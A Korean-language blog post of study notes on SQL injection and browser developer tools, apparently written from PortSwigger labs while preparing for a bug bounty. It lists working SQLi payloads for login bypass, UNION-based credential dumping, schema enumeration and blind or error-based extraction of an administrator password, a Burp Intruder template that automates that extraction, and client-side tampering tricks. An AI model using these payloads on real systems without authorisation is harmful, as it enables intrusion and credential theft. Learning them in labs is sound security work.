---
title: "웹 해킹 기초 — SQL Injection & 개발자 도구"
subtitle: "우리콘 준비하며 PortSwigger 랩으로 정리한 SQLi와 브라우저 분석"
date: 2026-11-05 09:00:00 +0900   # 발행 시 날짜 수정, _posts 로 옮기며 파일명 앞에 YYYY-MM-DD- 붙이기
category: tech
group: doc
tags: ["web", "sqli", "burp", "devtools"]
---

주력은 시스템(Pwnable) 쪽이지만, 우리콘(버그바운티) 준비를 계기로 웹도 팠다. PortSwigger 랩으로 SQL Injection을 집중적으로 돌리고, 브라우저 개발자 도구를 "분석 도구"로 쓰는 법을 같이 정리했다. (작성자 본인의 학습과 같이 업데이트될 예정.)

---

# 1. SQL Injection

## 취약점이 있는지부터 확인

입력값이 쿼리에 그대로 들어가는지, 따옴표 하나·참/거짓 조건으로 응답 차이를 본다.

```sql
'                 -- 에러 발생 → 취약 가능성
' OR 1=1--        -- 항상 참 (로그인 우회 등)
' OR 1=2--        -- 항상 거짓 (응답 차이 확인용)
```

주석은 DB마다 다르다.

| DB | 주석 | 비고 |
|----|------|------|
| MySQL | `-- `(공백 필수), `#` | URL에선 `#` → `%23`, `-- -`도 가능 |
| Oracle | `--` | 모든 SELECT에 `FROM 테이블` 필수 (더미 `DUAL`) |
| MSSQL / PostgreSQL | `--` | |

## UNION 공격 — 다른 테이블 데이터 끌어오기

원 쿼리 뒤에 `UNION SELECT`를 붙여 다른 데이터를 같은 응답에 실어 보낸다. 순서가 중요하다.

```sql
-- 1) 컬럼 수 파악
' ORDER BY 3--                 -- 에러 나면 컬럼 수 = 2
' UNION SELECT NULL,NULL--      -- 에러 없으면 컬럼 2개 확정

-- 2) 문자열 출력 가능한 컬럼 찾기
' UNION SELECT 'a',NULL--       -- 'a'가 보이면 그 자리 출력 가능

-- 3) 값 뽑기 (DB별 문자열 연결)
' UNION SELECT username||':'||password FROM users--      -- PostgreSQL/Oracle
' UNION SELECT CONCAT(username,':',password) FROM users--  -- MySQL/MSSQL
```

## DB 핑거프린팅 — 뭘 상대하는지

| DB | 버전 쿼리 |
|----|-----------|
| MySQL / MSSQL | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |
| Oracle | `SELECT * FROM v$version` |

버전을 알면 공격 문법(연결 연산자·SUBSTRING 등)과 알려진 취약점을 정할 수 있다.

## 구조 열거 — `information_schema`

컬럼명은 **추측하지 말고** 메타데이터로 먼저 확인한다. (난독화된 이름일 수 있음)

```sql
-- 1) 테이블 목록
' UNION SELECT table_name,NULL FROM information_schema.tables--
-- 2) 컬럼명
' UNION SELECT column_name,NULL FROM information_schema.columns
  WHERE table_name='users_kbpakp'--
-- 3) 데이터
' UNION SELECT username_oxlfuy,password_duzqjb FROM users_kbpakp--
```

## Blind SQLi — 출력이 없을 때

결과가 화면에 안 나와도, **응답의 차이**(메시지 유무·상태코드·응답 속도)로 true/false를 판별해 한 글자씩 뽑는다. 인젝션 포인트는 URL 파라미터뿐 아니라 쿠키·HTTP 헤더도 된다.

```sql
-- 조건이 먹히는지
' AND 1=1--    -- "Welcome back" 뜸  (참)
' AND 1=2--    -- 메시지 없음        (거짓)

-- 비밀번호 한 글자씩 (SUBSTRING + 이진 탐색)
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)>'m'--
```

응답 메시지 차이조차 없으면, **일부러 에러를 내서** 상태코드로 판별한다.

```sql
-- 참이면 1/0 실행 → 500, 거짓이면 'a' 반환 → 200
' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)>'m') THEN 1/0 ELSE 'a' END
  FROM users WHERE username='administrator')='a'--
```

| 상태코드 | 의미 | 조건 |
|----------|------|------|
| **500** | 서버 오류(1/0 실행됨) | 참 |
| **200** | 정상 | 거짓 |

> **따옴표 충돌 주의** — `ELSE 'a' … ='a'` 의 작은따옴표가 쿠키 헤더에서 충돌해 항상 500이 뜰 수 있다. 이땐 문자열 대신 숫자(`ELSE 123 … =123`)로 바꾸면 해결된다.

Time-based는 같은 원리에 신호만 "응답 지연"으로 바꾼 것이다. (MySQL `SLEEP()`, PostgreSQL `pg_sleep()`, MSSQL `WAITFOR DELAY` …)

## Burp Suite — 수동을 자동으로

- **기본 흐름**: Proxy로 요청 잡기 → HTTP History에서 우클릭 → **Send to Repeater** → 파라미터 변조·Send → Response 확인. (Intercept는 가로챌 때만 ON)
- Intruder Cluster Bomb으로 Blind 추출을 자동화한다. `§1§`=자릿수, `§a§`=테스트 글자로 모든 조합을 쏘고, **500인 행**(또는 "Welcome back" 길이가 다른 행)이 정답 글자.

```
' AND (SELECT CASE WHEN SUBSTRING(password,§1§,1)='§a§'
  THEN 1/0 ELSE 123 END FROM users WHERE username='administrator')=123--
```

| 유형 | 방식 | 용도 |
|------|------|------|
| Sniper | payload 1개, 위치 순차 | 단일 파라미터 퍼징 |
| **Cluster Bomb** | payload 여러 개, 모든 조합 | Blind 비밀번호 추출 |
| Pitchfork | 같은 인덱스끼리 짝 | 크레덴셜 스터핑 |

> 팁: 먼저 Repeater에서 `LENGTH()` 이진 탐색으로 비밀번호 길이를 확정하면, 자릿수 범위를 딱 맞춰 요청 수를 줄일 수 있다.

---

# 2. 개발자 도구 (F12)

웹 해킹에서 F12는 "구경"이 아니라 분석 도구다. 자주 쓰는 탭만.

| 탭 | 용도 |
|----|------|
| **Elements** | HTML 구조 보기·수정 |
| **Network** | 모든 요청/응답 캡처 (가장 많이 씀) |
| **Console** | JS 실행·에러 확인 |
| **Sources** | JS·숨은 경로 탐색 |

## Elements — 클라이언트 제한 우회

수정은 내 브라우저에만 적용되지만, **폼 제출·버튼 클릭 같은 액션이 있으면 서버에 영향을 줄 수 있다**.

```html
<!-- ① hidden 필드 조작 -->
<input type="hidden" name="role" value="user">   <!-- value="admin" 으로 바꿔 제출 -->

<!-- ② disabled 제거 -->
<button disabled>관리자 기능</button>              <!-- disabled 삭제 → 활성화 -->
```

서버가 이 값을 검증하지 않으면(클라 사이드 제한만 있으면) 그대로 뚫린다.

## Network — 요청이 다 보인다

- 핵심 기능(로그인·검색·재고 조회 등)은 대부분 **Fetch/XHR**(새로고침 없는 요청)로 처리된다 → 이 필터를 걸고 본다.
- 요청을 클릭하면 **Headers / Payload / Preview / Response / Cookies** 탭이 나온다.
- 봐야 할 헤더:

| 헤더 | 의미 | 관련성 |
|------|------|--------|
| **Cookie** | 세션/인증 쿠키 | ★★★ 탈취·조작 핵심 |
| **Authorization** | API 토큰 | ★★★ 탈취 시 계정 접근 |
| Set-Cookie | 서버가 쿠키 심는 곳 | — |
| User-Agent | 브라우저 정보 | 봇 탐지 우회 |

(상태코드: 200 성공 / 301·302 리다이렉트 / 401 인증 필요 / 403 권한 없음 / 500 서버 에러)

## Console — 클라 검증 우회

```js
document.cookie                               // 현재 쿠키 확인
localStorage                                  // 토큰 저장 여부
document.getElementById('password').value     // 특정 요소 값
```

## Sources — 숨은 비밀 찾기

로드된 JS에서 하드코딩된 키·엔드포인트를 찾는다. 파일 열고 `Ctrl+F` 로 `api_key`, `secret`, `token`, `admin`, `password` 검색.

---

## 마무리

시스템 쪽과 비교하면 웹은 "입력이 어디로 흘러 들어가는가"를 쫓는 것이 관건이었다. SQLi는 그 입력이 쿼리에 섞이는 경우고, F12·Burp는 그 흐름을 눈으로 보는 도구다.

이 정리로 우리콘에 나갔지만 실제 취약점은 한 건도 못 찾았다. 그 경험과 반성은 버그바운티 카테고리의 『우리콘 참가기』 글에 따로 적어 뒀다.
